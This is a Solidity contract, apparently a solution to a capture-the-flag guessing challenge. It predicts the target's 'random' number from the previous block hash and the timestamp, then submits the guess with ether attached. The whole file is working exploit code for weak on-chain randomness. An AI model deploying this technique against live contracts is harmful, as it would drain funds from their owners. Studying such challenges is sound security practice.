/**
 *Submitted for verification at Etherscan.io on 2022-05-22
*/

pragma solidity ^0.4.21;

contract guessInterface {
    function guess(uint8 n) external payable;
    function isComplete() external view returns (bool);
}

contract testInterface {
    function test() external payable;
}

contract hackContract {
    address guessInterfaceAddress = 0x7ECd21bF89f4CC4BA289C2a5571b1D44363dcc39;
    guessInterface guessContract = guessInterface(guessInterfaceAddress);

    address testInterfaceAddress = 0xA1939B549715aD241FB0aFdD08bfF2102DF4B233;
    testInterface testContract = testInterface(testInterfaceAddress);

    function tryHack() public payable {
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        guessContract.guess.value(msg.value)(answer);
        //msg.sender.transfer(2 ether);
    }

    function getComplete() public view returns(bool) {
        return guessContract.isComplete();
    }

    function test() public payable {
        //msg.sender.transfer(msg.value);
        testContract.test.value(msg.value)();
    }
}